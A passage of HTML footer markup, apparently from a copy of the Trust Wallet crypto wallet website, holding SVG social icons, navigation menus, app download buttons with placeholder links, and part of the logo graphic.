              <path style="fill:currentcolor" class="default-transition text-trustWhite dark:text-trustBlack" d="M19.0446 6.33228H16.8406C15.8664 6.33228 14.9321 6.71928 14.2432 7.40816C13.5544 8.09703 13.1674 9.03135 13.1674 10.0056V12.2095H10.9634V15.1482H13.1674V21.0254H16.106V15.1482H18.31L19.0446 12.2095H16.106V10.0056C16.106 9.81072 16.1834 9.62386 16.3212 9.48608C16.4589 9.34831 16.6458 9.27091 16.8406 9.27091H19.0446V6.33228Z"></path>
            </svg>
          </a>
          <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite">
            <svg width="31" height="31" viewBox="0 0 31 31" class="default-transition text-trustBlack dark:text-trustWhite default-transition text-trustBlack dark:text-trustWhite">
              <rect x="0.875854" width="30.0779" height="30.0779" rx="4.71921" style="fill:currentcolor"></rect>
              <path style="fill:currentcolor" class="default-transition text-trustWhite dark:text-trustBlack" d="M15.6233 5.89941C14.4613 5.89941 13.3107 6.13397 12.2371 6.58969C11.1636 7.04541 10.1881 7.71337 9.36645 8.55543C7.70703 10.256 6.77478 12.5626 6.77478 14.9676C6.77478 18.9758 9.31431 22.3763 12.8272 23.5824C13.2696 23.655 13.4112 23.3738 13.4112 23.129V21.5965C10.9601 22.1406 10.4381 20.3813 10.4381 20.3813C10.031 19.3294 9.45588 19.0483 9.45588 19.0483C8.65067 18.4861 9.51782 18.5042 9.51782 18.5042C10.4027 18.5677 10.8716 19.4382 10.8716 19.4382C11.6415 20.8166 12.9422 20.4085 13.4466 20.1909C13.5262 19.6015 13.7563 19.2025 14.004 18.9758C12.0397 18.7491 9.97795 17.9692 9.97795 14.5142C9.97795 13.5076 10.3142 12.7006 10.8893 12.0567C10.8009 11.83 10.4912 10.8869 10.9778 9.66272C10.9778 9.66272 11.7211 9.41788 13.4112 10.5877C14.1102 10.3882 14.8712 10.2884 15.6233 10.2884C16.3754 10.2884 17.1364 10.3882 17.8354 10.5877C19.5255 9.41788 20.2688 9.66272 20.2688 9.66272C20.7554 10.8869 20.4457 11.83 20.3573 12.0567C20.9324 12.7006 21.2687 13.5076 21.2687 14.5142C21.2687 17.9783 19.1981 18.74 17.2249 18.9667C17.5434 19.2478 17.8354 19.801 17.8354 20.6443V23.129C17.8354 23.3738 17.977 23.664 18.4283 23.5824C21.9411 22.3673 24.4718 18.9758 24.4718 14.9676C24.4718 13.7768 24.243 12.5976 23.7983 11.4974C23.3536 10.3972 22.7018 9.39749 21.8802 8.55543C21.0585 7.71337 20.083 7.04541 19.0095 6.58969C17.9359 6.13397 16.7853 5.89941 15.6233 5.89941Z"></path>
            </svg>
          </a>
          <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite">
            <svg width="31" height="31" viewBox="0 0 31 31" class="default-transition text-trustBlack dark:text-trustWhite default-transition text-trustBlack dark:text-trustWhite">
              <rect x="0.751709" width="30.0779" height="30.0779" rx="4.71921" style="fill:currentcolor"></rect>
              <path style="fill:currentcolor" class="default-transition text-trustWhite dark:text-trustBlack" d="M16.1075 11.0791C18.4302 11.0791 20.3474 12.9963 20.3474 15.319C20.3474 17.6786 18.4302 19.559 16.1075 19.559C13.7479 19.559 11.8676 17.6786 11.8676 15.319C11.8676 12.9963 13.7479 11.0791 16.1075 11.0791ZM16.1075 18.0842C17.6191 18.0842 18.8358 16.8675 18.8358 15.319C18.8358 13.8074 17.6191 12.5907 16.1075 12.5907C14.559 12.5907 13.3423 13.8074 13.3423 15.319C13.3423 16.8675 14.5959 18.0842 16.1075 18.0842ZM21.4904 10.9317C21.4904 11.4847 21.0479 11.9271 20.4949 11.9271C19.9419 11.9271 19.4994 11.4847 19.4994 10.9317C19.4994 10.3786 19.9419 9.93619 20.4949 9.93619C21.0479 9.93619 21.4904 10.3786 21.4904 10.9317ZM24.2924 11.9271C24.3661 13.2913 24.3661 17.3837 24.2924 18.7478C24.2186 20.0751 23.9237 21.2181 22.9651 22.2135C22.0065 23.1721 20.8267 23.4671 19.4994 23.5408C18.1353 23.6145 14.0428 23.6145 12.6787 23.5408C11.3514 23.4671 10.2085 23.1721 9.21303 22.2135C8.25444 21.2181 7.95949 20.0751 7.88575 18.7478C7.81201 17.3837 7.81201 13.2913 7.88575 11.9271C7.95949 10.5998 8.25444 9.42003 9.21303 8.46144C10.2085 7.50285 11.3514 7.2079 12.6787 7.13416C14.0428 7.06042 18.1353 7.06042 19.4994 7.13416C20.8267 7.2079 22.0065 7.50285 22.9651 8.46144C23.9237 9.42003 24.2186 10.5998 24.2924 11.9271ZM22.5227 20.1857C22.9651 19.1165 22.8545 16.5357 22.8545 15.319C22.8545 14.1392 22.9651 11.5584 22.5227 10.4524C22.2277 9.75185 21.6747 9.16195 20.9742 8.90387C19.8681 8.46144 17.2873 8.57205 16.1075 8.57205C14.8908 8.57205 12.31 8.46144 11.2408 8.90387C10.5034 9.19882 9.9504 9.75185 9.65545 10.4524C9.21303 11.5584 9.32363 14.1392 9.32363 15.319C9.32363 16.5357 9.21303 19.1165 9.65545 20.1857C9.9504 20.9231 10.5034 21.4761 11.2408 21.7711C12.31 22.2135 14.8908 22.1029 16.1075 22.1029C17.2873 22.1029 19.8681 22.2135 20.9742 21.7711C21.6747 21.4761 22.2646 20.9231 22.5227 20.1857Z"></path>
            </svg>
          </a>
          <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite">
            <svg width="31" height="31" fill="none" viewBox="0 0 31 31" class="default-transition h-[31px] min-w-[31px] text-trustBlack dark:text-trustWhite default-transition text-trustBlack dark:text-trustWhite">
              <rect width="30.078" height="30.078" x=".598" y=".811" rx="4.719" style="fill:currentcolor"></rect>
              <path fill="#DBDCE5" style="fill:currentcolor" class="default-transition text-trustWhite dark:text-trustBlack" d="m17.22 15.021 6.203-7.131h-1.47l-5.386 6.192-4.301-6.192H7.305l6.504 9.363-6.504 7.478h1.47l5.687-6.539 4.543 6.54h4.96L17.22 15.02Zm-2.013 2.315-.659-.933-5.244-7.419h2.258l4.232 5.988.659.932 5.5 7.783h-2.257l-4.489-6.351Z"></path>
            </svg>
          </a>
          <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" class="default-transition h-[31px] min-w-[31px] text-trustBlack dark:text-trustWhite default-transition text-trustBlack dark:text-trustWhite">
              <rect x="0.265625" y="0.03125" width="23.0244" height="23.0244" rx="3.61253" style="fill:currentcolor"></rect>
              <path style="fill:currentcolor" class="default-transition text-trustWhite dark:text-trustBlack" fill-rule="evenodd" clip-rule="evenodd" d="M17.1886 6.82916C16.2137 6.38345 15.1784 6.05816 14.0978 5.87695C13.9615 6.11109 13.8109 6.42886 13.7056 6.67806C12.5563 6.51165 11.4151 6.51165 10.2816 6.67806C10.1762 6.42886 10.0165 6.11109 9.88938 5.87695C8.80121 6.05841 7.76596 6.38287 6.79795 6.82916C4.84069 9.71589 4.31169 12.5345 4.57611 15.3155C5.87602 16.2601 7.13051 16.8344 8.36302 17.2123C8.66574 16.8042 8.93751 16.3659 9.17165 15.9049C8.72594 15.7385 8.30257 15.5345 7.89457 15.2928C7.99994 15.2176 8.1053 15.1339 8.20481 15.0512C10.6684 16.1771 13.3367 16.1771 15.7701 15.0512C15.7954 15.0712 15.8204 15.0913 15.8452 15.1112L15.8452 15.1112C15.9237 15.1741 16.0003 15.2357 16.0804 15.2928C15.6731 15.5345 15.2492 15.7385 14.8034 15.9049C15.0375 16.3657 15.3093 16.8042 15.612 17.2123C16.8437 16.8343 18.1058 16.2601 19.3988 15.3155C19.7241 12.0963 18.8837 9.30028 17.1914 6.82916H17.1886ZM9.51027 13.5624C8.76937 13.5624 8.16512 12.8901 8.16512 12.0662C8.16512 11.2425 8.75466 10.5699 9.51027 10.5699C10.2578 10.5699 10.8705 11.2422 10.8553 12.0662C10.8553 12.8898 10.2583 13.5624 9.51027 13.5624ZM14.4758 13.5624C13.7358 13.5624 13.13 12.8901 13.13 12.0662C13.13 11.2425 13.7204 10.5699 14.4758 10.5699C15.2234 10.5699 15.8361 11.2422 15.821 12.0662C15.821 12.8898 15.2315 13.5624 14.4758 13.5624Z"></path>
            </svg>
          </a>
          <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite">
            <svg width="31" height="31" viewBox="0 0 31 31" class="default-transition text-trustBlack dark:text-trustWhite default-transition text-trustBlack dark:text-trustWhite">
              <rect x="0.50354" width="30.0779" height="30.0779" rx="4.71921" style="fill:currentcolor"></rect>
              <path style="fill:currentcolor" class="default-transition text-trustWhite dark:text-trustBlack" d="M25.2794 13.7986C25.2793 13.3146 25.1401 12.8409 24.8785 12.4337C24.6168 12.0265 24.2436 11.7031 23.8034 11.502C23.3632 11.3009 22.8745 11.2304 22.3954 11.2991C21.9163 11.3678 21.467 11.5727 21.101 11.8894C19.779 11.1869 18.1997 10.7623 16.5501 10.6636L16.9598 8.2035L18.3583 8.41818C18.4293 8.85935 18.6539 9.26124 18.9925 9.55281C19.3311 9.84438 19.7619 10.0069 20.2088 10.0115C20.6556 10.0162 21.0897 9.86274 21.4343 9.57831C21.7789 9.29388 22.0119 8.89677 22.0921 8.45717C22.1722 8.01758 22.0944 7.5638 21.8723 7.17603C21.6503 6.78827 21.2983 6.4915 20.8785 6.33816C20.4588 6.18483 19.9984 6.1848 19.5787 6.3381C19.159 6.49139 18.8069 6.78813 18.5848 7.17587L16.5328 6.86017C16.3686 6.83485 16.2011 6.87525 16.0665 6.97261C15.9319 7.06997 15.8411 7.21645 15.8137 7.38029L15.2715 10.6542C13.5478 10.7284 11.8919 11.1577 10.5154 11.8894C10.0127 11.4647 9.36414 11.253 8.70774 11.2993C8.05133 11.3457 7.43892 11.6463 7.00085 12.1374C6.56279 12.6284 6.33366 13.271 6.36225 13.9285C6.39083 14.5859 6.67487 15.2062 7.1539 15.6573C7.03114 16.0792 6.96869 16.5163 6.96843 16.9557C6.96843 18.6865 7.91555 20.2982 9.64483 21.4932C11.2999 22.6384 13.4886 23.2698 15.8082 23.2698C18.1279 23.2698 20.3165 22.6384 21.9716 21.4932C23.7009 20.2982 24.648 18.6865 24.648 16.9557C24.6477 16.5163 24.5853 16.0792 24.4625 15.6573C24.7193 15.4204 24.9243 15.133 25.0649 14.8132C25.2055 14.4934 25.2785 14.148 25.2794 13.7986ZM20.2281 7.48448C20.353 7.48448 20.4751 7.52151 20.5789 7.59089C20.6827 7.66027 20.7637 7.75888 20.8115 7.87426C20.8592 7.98963 20.8717 8.11659 20.8474 8.23907C20.823 8.36156 20.7629 8.47406 20.6746 8.56237C20.5863 8.65067 20.4738 8.71081 20.3513 8.73517C20.2288 8.75953 20.1018 8.74703 19.9865 8.69924C19.8711 8.65145 19.7725 8.57052 19.7031 8.46668C19.6337 8.36285 19.5967 8.24077 19.5967 8.11589C19.5967 7.94843 19.6632 7.78783 19.7816 7.66941C19.9 7.551 20.0606 7.48448 20.2281 7.48448ZM11.3883 15.6929C11.3883 15.4431 11.4624 15.1989 11.6011 14.9913C11.7399 14.7836 11.9371 14.6217 12.1679 14.5261C12.3986 14.4306 12.6525 14.4056 12.8975 14.4543C13.1425 14.503 13.3675 14.6233 13.5441 14.7999C13.7207 14.9765 13.841 15.2015 13.8897 15.4465C13.9384 15.6914 13.9134 15.9454 13.8178 16.1761C13.7223 16.4069 13.5604 16.6041 13.3527 16.7429C13.1451 16.8816 12.9009 16.9557 12.6511 16.9557C12.3162 16.9557 11.995 16.8226 11.7582 16.5858C11.5214 16.349 11.3883 16.0278 11.3883 15.6929ZM18.6298 20.0393C17.761 20.5011 16.7921 20.7425 15.8082 20.7425C14.8243 20.7425 13.8554 20.5011 12.9866 20.0393C12.9133 20.0005 12.8484 19.9476 12.7956 19.8836C12.7427 19.8196 12.703 19.7459 12.6787 19.6666C12.6544 19.5873 12.6459 19.504 12.6538 19.4214C12.6616 19.3389 12.6857 19.2586 12.7245 19.1854C12.7634 19.1121 12.8163 19.0472 12.8803 18.9943C12.9442 18.9415 13.018 18.9018 13.0973 18.8775C13.1766 18.8531 13.2599 18.8447 13.3425 18.8525C13.425 18.8604 13.5053 18.8844 13.5785 18.9233C14.2651 19.2883 15.0307 19.4792 15.8082 19.4792C16.5857 19.4792 17.3514 19.2883 18.0379 18.9233C18.1112 18.8844 18.1914 18.8604 18.274 18.8525C18.3565 18.8447 18.4399 18.8531 18.5192 18.8775C18.5985 18.9018 18.6722 18.9415 18.7361 18.9943C18.8001 19.0472 18.853 19.1121 18.8919 19.1854C18.9307 19.2586 18.9548 19.3389 18.9627 19.4214C18.9705 19.504 18.9621 19.5873 18.9377 19.6666C18.9134 19.7459 18.8737 19.8196 18.8209 19.8836C18.768 19.9476 18.7031 20.0005 18.6298 20.0393ZM18.9653 16.9557C18.7155 16.9557 18.4714 16.8816 18.2637 16.7429C18.056 16.6041 17.8942 16.4069 17.7986 16.1761C17.703 15.9454 17.678 15.6914 17.7267 15.4465C17.7754 15.2015 17.8957 14.9765 18.0723 14.7999C18.2489 14.6233 18.4739 14.503 18.7189 14.4543C18.9639 14.4056 19.2178 14.4306 19.4485 14.5261C19.6793 14.6217 19.8765 14.7836 20.0153 14.9913C20.154 15.1989 20.2281 15.4431 20.2281 15.6929C20.2281 16.0278 20.0951 16.349 19.8582 16.5858C19.6214 16.8226 19.3002 16.9557 18.9653 16.9557Z"></path>
            </svg>
          </a>
          <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite">
            <svg width="31" height="31" viewBox="0 0 31 31" class="default-transition text-trustBlack dark:text-trustWhite default-transition text-trustBlack dark:text-trustWhite">
              <rect x="0.379395" width="30.0779" height="30.0779" rx="4.71921" style="fill:currentcolor"></rect>
              <path style="fill:currentcolor" class="default-transition text-trustWhite dark:text-trustBlack" d="M7.36307 13.7554L17.906 9.20518C18.9464 8.73119 22.4746 7.21444 22.4746 7.21444C22.4746 7.21444 24.103 6.55086 23.9673 8.16241C23.9221 8.82599 23.5602 11.1485 23.1984 13.6643L22.0675 21.1095C22.0675 21.1095 21.977 22.1996 21.2081 22.3892C20.4391 22.5788 19.1726 21.7257 18.9464 21.5361C18.7654 21.3939 15.5539 19.2609 14.3778 18.2182C14.0611 17.9338 13.6993 17.365 14.423 16.7014C16.0514 15.1373 17.9965 13.1939 19.1726 11.9616C19.7154 11.3928 20.2582 10.0656 17.9965 11.6772L11.615 16.1727C11.615 16.1727 10.8913 16.6467 9.53429 16.2201C8.17728 15.7936 6.59409 15.2248 6.59409 15.2248C6.59409 15.2248 5.50848 14.5138 7.36307 13.7554Z"></path>
            </svg>
          </a>
        </div>
      </div>
      <ul class="mt-8 flex flex-wrap justify-around gap-6 desktop:col-start-2 desktop:col-end-4 desktop:row-start-1 desktop:mt-0 desktop:grid desktop:grid-cols-[repeat(5,1fr)] desktop:gap-7 desktop:justify-self-start">
        <li class="w-fit max-w-[110px] desktop:max-w-none">
          <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodySmall leading-mobileBodySmall tablet:text-desktopBodySmall tablet:leading-desktopBodySmall">Wallet</strong>
          <nav class="mt-4 grid gap-2">
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Mobile App</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Browser Extension</a>
          </nav>
        </li>
        <li class="w-fit max-w-[110px] desktop:max-w-none">
          <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodySmall leading-mobileBodySmall tablet:text-desktopBodySmall tablet:leading-desktopBodySmall">Features</strong>
          <nav class="mt-4 grid gap-2">
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Buy Crypto</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Swaps</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Staking</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">NFTs</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Security</a>
          </nav>
        </li>
        <li class="w-fit max-w-[110px] desktop:max-w-none">
          <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodySmall leading-mobileBodySmall tablet:text-desktopBodySmall tablet:leading-desktopBodySmall">Build</strong>
          <nav class="mt-4 grid gap-2">
            <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block">Developer Docs</a>
            <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block">Wallet Core</a>
            <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block">Submit dApp</a>
            <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block">Get assets listed</a>
          </nav>
        </li>
        <li class="w-fit max-w-[110px] desktop:max-w-none">
          <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodySmall leading-mobileBodySmall tablet:text-desktopBodySmall tablet:leading-desktopBodySmall">Support</strong>
          <nav class="mt-4 grid gap-2">
            <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block">FAQ</a>
            <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block">Community Forum</a>
            <a target="_blank" rel="noopener noreferrer" href="#" class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block">Contact Us</a>
          </nav>
        </li>
        <li class="w-fit max-w-[110px] desktop:max-w-none">
          <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodySmall leading-mobileBodySmall tablet:text-desktopBodySmall tablet:leading-desktopBodySmall">About</strong>
          <nav class="mt-4 grid gap-2">
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">About Us</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Careers</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Press Kit</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Terms of Service</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Privacy Policy</a>
            <a class="default-transition flex items-center gap-3 font-inter text-mobileBodyMedium leading-mobileBodyMedium tablet:text-desktopBodyMedium tablet:leading-desktopBodyMedium text-trustBlack hover:underline dark:text-trustWhite block" href="#">Blog</a>
          </nav>
        </li>
      </ul>
      <div class="mt-8 text-center desktop:col-start-2 desktop:row-start-2 desktop:row-end-4 desktop:mt-0 desktop:block desktop:text-left">
        <strong class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodySmall leading-mobileBodySmall tablet:text-desktopBodySmall tablet:leading-desktopBodySmall">Download Trust Wallet</strong>
        <p class="default-transition text-lightBlack font-inter dark:text-trustWhite text-mobileBodySmall leading-mobileBodySmall tablet:text-desktopBodySmall tablet:leading-desktopBodySmall mb-4 mt-1">The most trusted &amp; secure crypto wallet.</p>
        <div class="flex max-w-[330px] flex-wrap gap-3 desktop:max-w-none">
          <a target="_blank" class="px-5 py-2.5 h-9 default-transition relative z-10 overflow-hidden flex items-center justify-center gap-3 rounded-full text-center text-mobileButton font-medium leading-mobileButton bg-transparent border text-trustBlue border-trustBlue dark:text-trustGreen dark:border-trustGreen | hover:bg-trustBlue hover:text-trustWhite dark:hover:text-trustBlack dark:hover:bg-trustGreen w-full !text-[13px] desktop:w-fit" href="#">Download for iOS <svg width="17" height="20" viewBox="0 0 17 20" fill="none" class="h-[18px] w-auto">
              <path d="M13.6264 10.8929C13.6048 8.48359 15.5992 7.31145 15.6904 7.25688C14.5609 5.61004 12.8101 5.38504 12.1949 5.36709C10.7245 5.21235 9.29817 6.24695 8.54914 6.24695C7.78515 6.24695 6.63169 5.38204 5.38853 5.40746C3.7888 5.43213 2.29222 6.35833 1.47142 7.7966C-0.22251 10.7292 1.04083 15.0388 2.66375 17.4092C3.47558 18.5702 4.42421 19.8664 5.66587 19.8208C6.88063 19.7707 7.33438 19.0464 8.80031 19.0464C10.2528 19.0464 10.6789 19.8208 11.9452 19.7916C13.2489 19.7707 14.0697 18.6255 14.8532 17.4541C15.7913 16.1235 16.1681 14.813 16.183 14.7457C16.1524 14.7353 13.6511 13.7807 13.6264 10.8929Z" style="fill:currentcolor"></path>
              <path d="M11.2914 3.51592C11.9447 2.69886 12.3918 1.58727 12.2677 0.459229C11.322 0.501091 10.1394 1.11333 9.4584 1.91245C8.85588 2.61663 8.31765 3.77084 8.45669 4.85627C9.51895 4.93551 10.6096 4.32028 11.2914 3.51592Z" style="fill:currentcolor"></path>
            </svg>
          </a>
          <a target="_blank" class="px-5 py-2.5 h-9 default-transition relative z-10 overflow-hidden flex items-center justify-center gap-3 rounded-full text-center text-mobileButton font-medium leading-mobileButton bg-transparent border text-trustBlue border-trustBlue dark:text-trustGreen dark:border-trustGreen | hover:bg-trustBlue hover:text-trustWhite dark:hover:text-trustBlack dark:hover:bg-trustGreen w-full !text-[13px] desktop:w-fit" href="#">Download Extension <img alt="Chrome" width="71" height="71" decoding="async" class="h-[18px] w-auto" style="color:transparent" src="assets/images/chrome.svg">
          </a>
          <a class="px-5 py-2.5 h-9 default-transition relative z-10 overflow-hidden flex items-center justify-center gap-3 rounded-full text-center text-mobileButton font-medium leading-mobileButton bg-transparent border text-trustBlue border-trustBlue dark:text-trustGreen dark:border-trustGreen | hover:bg-trustBlue hover:text-trustWhite dark:hover:text-trustBlack dark:hover:bg-trustGreen w-full !text-[13px] desktop:w-fit" href="#">Download APK <svg width="20" height="23" viewBox="0 0 20 23" fill="none" class="h-[18px] w-auto">
              <path fill-rule="evenodd" clip-rule="evenodd" d="M13.1661 2.03226L12.9174 2.39815C14.8051 3.25494 16.083 4.87765 16.083 6.73464H3.62062C3.62062 4.87765 4.89853 3.25494 6.7876 2.39815L6.53741 2.03226L6.28858 1.67167L5.73418 0.860934C5.6666 0.760914 5.69497 0.626695 5.79642 0.560918C5.89917 0.495053 6.03709 0.521407 6.10605 0.621428L6.70103 1.49008L6.95122 1.85457L7.20409 2.22572C8.00869 1.92171 8.90658 1.75195 9.85177 1.75195C10.7984 1.75195 11.6949 1.92171 12.4995 2.22572L12.7537 1.85457L13.6002 0.621428C13.6665 0.521407 13.8058 0.493753 13.9072 0.560918C14.0099 0.626695 14.0384 0.760914 13.9694 0.860934L13.4149 1.67167L13.1661 2.03226ZM3.62062 7.60078H3.71665H16.083V17.132C16.083 17.8887 15.4528 18.5046 14.6739 18.5046H13.6557C13.6908 18.6191 13.7111 18.7389 13.7111 18.8652V21.6093C13.7111 22.3266 13.112 22.9083 12.3737 22.9083C11.6368 22.9083 11.0391 22.3266 11.0391 21.6093V18.8652C11.0391 18.7389 11.058 18.6191 11.0918 18.5046H8.61176C8.64555 18.6191 8.66584 18.7389 8.66584 18.8652V21.6093C8.66584 22.3266 8.06682 22.9083 7.32988 22.9083C6.59286 22.9083 5.99384 22.3266 5.99384 21.6093V18.8652C5.99384 18.7389 6.01275 18.6191 6.04792 18.5046H5.03103C4.25214 18.5046 3.62062 17.8887 3.62062 17.132V7.60078ZM1.39463 7.60078C0.65632 7.60078 0.0585938 8.18254 0.0585938 8.89976V14.4603C0.0585938 15.1776 0.65632 15.7593 1.39463 15.7593C2.13157 15.7593 2.7293 15.1776 2.7293 14.4603V8.89976C2.7293 8.18254 2.13157 7.60078 1.39463 7.60078ZM16.9739 8.89976C16.9739 8.18254 17.5716 7.60078 18.31 7.60078C19.0469 7.60078 19.6446 8.18254 19.6446 8.89976V14.4603C19.6446 15.1776 19.0469 15.7593 18.31 15.7593C17.5716 15.7593 16.9739 15.1776 16.9739 14.4603V8.89976ZM6.09745 5.00125C5.72833 5.00125 5.42961 4.71049 5.42961 4.35126C5.42961 3.99203 5.72833 3.70262 6.09745 3.70262C6.4665 3.70262 6.76529 3.99203 6.76529 4.35126C6.76529 4.71049 6.4665 5.00125 6.09745 5.00125ZM10.7712 4.35126C10.7712 4.71049 11.07 5.00125 11.4391 5.00125C11.8081 5.00125 12.1069 4.71049 12.1069 4.35126C12.1069 3.99203 11.8081 3.70262 11.4391 3.70262C11.07 3.70262 10.7712 3.99203 10.7712 4.35126Z" style="fill:currentcolor"></path>
            </svg>
          </a>
          <a target="_blank" class="px-5 py-2.5 h-9 default-transition relative z-10 overflow-hidden flex items-center justify-center gap-3 rounded-full text-center text-mobileButton font-medium leading-mobileButton bg-transparent border text-trustBlue border-trustBlue dark:text-trustGreen dark:border-trustGreen | hover:bg-trustBlue hover:text-trustWhite dark:hover:text-trustBlack dark:hover:bg-trustGreen w-full !text-[13px] desktop:w-fit" href="#">Download for Android <img alt="App Store" width="86" height="77" decoding="async" class="h-[18px] w-auto" style="color:transparent" src="assets/images/playstore.png">
          </a>
        </div>
      </div>
      <div class="mt-8 flex items-center justify-center gap-3 desktop:row-start-2 desktop:mt-0 desktop:items-start desktop:justify-start desktop:gap-7"></div>
      <div class="mx-auto mt-8 self-center desktop:col-start-1 desktop:row-start-1 desktop:row-end-4 desktop:mt-0">
        <svg width="293" height="80" viewBox="0 0 293 80" fill="none" exponent="3940820" class="desktop:hidden">
          <g clip-path="url(#clip0_1578_1401183940820)">
            <path d="M133.461 18.6951H147.398V26.5015C151.964 19.4857 157.219 18.6951 164.911 18.6951V32.4906H161.408C152.19 32.4906 147.778 36.8281 147.778 45.4202V60.0842H133.461V18.6951Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
            <path d="M211.41 60.0842H197.097V56.1385C193.971 59.7655 189.711 61.3419 184.459 61.3419C174.485 61.3419 168.846 55.4281 168.846 44.5517V18.6951H183.16V41.3236C183.16 46.4443 185.673 49.4389 189.935 49.4389C194.197 49.4389 197.094 46.5198 197.094 41.5571V18.6951H211.408V60.0842H211.41Z" style="fill:currentColor" class="default-transition text-trustBlue [transition-property:color] dark:text-trustGreen"></path>
